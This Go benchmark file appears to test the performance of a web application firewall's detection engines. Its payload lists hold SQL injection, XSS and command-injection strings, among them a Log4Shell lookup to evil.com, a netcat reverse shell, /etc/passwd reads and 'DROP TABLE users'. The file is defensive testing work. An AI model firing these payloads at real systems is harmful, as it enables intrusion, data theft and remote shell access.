package unit

import (
	"context"
	"net/http"
	"net/url"
	"testing"

	"github.com/FortressWAF/FortressWAF/internal/engine"
)

func newBenchmarkRequest(method, path string, queryParams map[string]string) *http.Request {
	req := &http.Request{
		Method: method,
		URL: &url.URL{
			Path:     path,
			RawQuery: "",
		},
		Header: make(http.Header),
		Body:   nil,
		Host:   "example.com",
	}
	if len(queryParams) > 0 {
		q := req.URL.Query()
		for k, v := range queryParams {
			q.Add(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}
	return req
}

func newBenchmarkContext(req *http.Request) *engine.RequestContext {
	return &engine.RequestContext{
		Request:   req,
		RealIP:    "192.168.1.1",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Path:      req.URL.Path,
		Method:    req.Method,
		Headers:   make(map[string]string),
		Body:      nil,
		ContentType: "text/html",
		Context:   context.Background(),
	}
}

// Benchmark: SQL Injection Detection
func BenchmarkSQLInjectionDetection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"' OR '1'='1",
		"1 UNION SELECT NULL--",
		"admin'--",
		"'; DROP TABLE users--",
		"1' OR '1'='1",
		"1 UNION SELECT NULL,NULL,NULL--",
		"' OR 1=1--",
		"1' AND SLEEP(5)--",
		"0x3127204f52202731273d2731",
		"%27%20OR%20%271%27%3D%271",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, payload := range payloads {
			req := newBenchmarkRequest("GET", "/search", map[string]string{"query": payload})
			ctx := newBenchmarkContext(req)
			e.Inspect(ctx)
		}
	}
}

func BenchmarkSQLInjectionSinglePayload(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	}
	e := engine.New(cfg)
	payload := "' OR '1'='1"
	req := newBenchmarkRequest("GET", "/search", map[string]string{"query": payload})
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: XSS Detection
func BenchmarkXSSDetection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"onclick=alert(1)",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<iframe src=javascript:alert(1)>",
		"<a onmouseover=alert(1)>",
		"';alert(1);//",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, payload := range payloads {
			req := newBenchmarkRequest("GET", "/comment", map[string]string{"text": payload})
			ctx := newBenchmarkContext(req)
			e.Inspect(ctx)
		}
	}
}

func BenchmarkXSSSinglePayload(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	}
	e := engine.New(cfg)
	payload := "<script>alert(1)</script>"
	req := newBenchmarkRequest("GET", "/comment", map[string]string{"text": payload})
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: RCE Detection
func BenchmarkRCEDetection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"`cat /etc/passwd`",
		"$(cat /etc/passwd)",
		"{{7*7}}",
		"${jndi:ldap://evil.com/a}",
		"& whoami",
		"; ping -c 3 127.0.0.1",
		"| nc -e /bin/sh 10.0.0.1 1234",
		"%24%7B%7B7*7%7D%7D",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, payload := range payloads {
			req := newBenchmarkRequest("GET", "/api/exec", map[string]string{"cmd": payload})
			ctx := newBenchmarkContext(req)
			e.Inspect(ctx)
		}
	}
}

func BenchmarkRCESinglePayload(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	}
	e := engine.New(cfg)
	payload := "$(cat /etc/passwd)"
	req := newBenchmarkRequest("GET", "/api/exec", map[string]string{"cmd": payload})
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: Bot Detection
func BenchmarkBotDetection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	}
	e := engine.New(cfg)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"sqlmap/1.4.2#stable (http://sqlmap.org)",
		"Nikto/2.1.6",
		"HeadlessChrome/91.0.4472.0 Safari/537.36",
		"curl/7.68.0",
		"wget/1.20.3",
		"Python-urllib/3.9",
		"Go-http-client/1.1",
		"axios/0.21.1",
		"scrapy/2.5.0",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, ua := range userAgents {
			req := newBenchmarkRequest("GET", "/", nil)
			ctx := newBenchmarkContext(req)
			ctx.UserAgent = ua
			e.Inspect(ctx)
		}
	}
}

func BenchmarkBotSingleUserAgent(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	}
	e := engine.New(cfg)
	req := newBenchmarkRequest("GET", "/", nil)
	ctx := newBenchmarkContext(req)
	ctx.UserAgent = "sqlmap/1.4.2#stable"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: DDoS Protection
func BenchmarkDDoSProtection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		DDoS:    engine.NewDDoSProtection(false),
	}
	e := engine.New(cfg)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := newBenchmarkRequest("GET", "/api/data", nil)
		ctx := newBenchmarkContext(req)
		e.Inspect(ctx)
	}
}

func BenchmarkDDoSSingleRequest(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode: false,
		DDoS:    engine.NewDDoSProtection(false),
	}
	e := engine.New(cfg)
	req := newBenchmarkRequest("GET", "/api/data", nil)
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: Full Engine Inspection
func BenchmarkFullEngineInspection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode:    false,
		SQLI:       engine.NewSQLInjectionEngine(false),
		XSS:        engine.NewXSSEngine(false),
		RCE:        engine.NewRCEInjection(false),
		DDoS:       engine.NewDDoSProtection(false),
		Protocol:   engine.NewProtocolAnomaly(false),
		Bot:        engine.NewBotDetector(false),
	}
	e := engine.New(cfg)

	requests := []struct {
		method string
		path   string
		query  map[string]string
	}{
		{"GET", "/", nil},
		{"GET", "/search", map[string]string{"q": "normal search"}},
		{"POST", "/api/data", map[string]string{"name": "test"}},
		{"GET", "/admin", nil},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, r := range requests {
			req := newBenchmarkRequest(r.method, r.path, r.query)
			ctx := newBenchmarkContext(req)
			e.Inspect(ctx)
		}
	}
}

func BenchmarkFullEngineNormalRequest(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode:    false,
		SQLI:       engine.NewSQLInjectionEngine(false),
		XSS:        engine.NewXSSEngine(false),
		RCE:        engine.NewRCEInjection(false),
		DDoS:       engine.NewDDoSProtection(false),
		Protocol:   engine.NewProtocolAnomaly(false),
		Bot:        engine.NewBotDetector(false),
	}
	e := engine.New(cfg)
	req := newBenchmarkRequest("GET", "/api/users", map[string]string{"page": "1", "limit": "10"})
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

func BenchmarkFullEngineAttackRequest(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode:    false,
		SQLI:       engine.NewSQLInjectionEngine(false),
		XSS:        engine.NewXSSEngine(false),
		RCE:        engine.NewRCEInjection(false),
		DDoS:       engine.NewDDoSProtection(false),
		Protocol:   engine.NewProtocolAnomaly(false),
		Bot:        engine.NewBotDetector(false),
	}
	e := engine.New(cfg)
	req := newBenchmarkRequest("GET", "/search", map[string]string{"q": "' OR '1'='1 UNION SELECT NULL--"})
	ctx := newBenchmarkContext(req)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(ctx)
	}
}

// Benchmark: RequestContext Creation
func BenchmarkRequestContextCreation(b *testing.B) {
	payloads := []string{
		"normal search",
		"' OR '1'='1",
		"<script>alert(1)</script>",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, q := range payloads {
			req := newBenchmarkRequest("GET", "/search", map[string]string{"q": q})
			_ = engine.NewRequestContext(req)
		}
	}
}

// Benchmark: Protocol Anomaly
func BenchmarkProtocolDetection(b *testing.B) {
	cfg := engine.EngineConfig{
		DevMode:  false,
		Protocol: engine.NewProtocolAnomaly(false),
	}
	e := engine.New(cfg)

	methods := []string{"GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, method := range methods {
			req := newBenchmarkRequest(method, "/", nil)
			ctx := newBenchmarkContext(req)
			e.Inspect(ctx)
		}
	}
}
